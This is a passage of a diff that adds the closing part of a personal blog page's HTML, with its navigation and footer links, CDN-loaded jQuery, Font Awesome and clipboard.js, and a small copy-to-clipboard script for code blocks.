+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    RacerZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
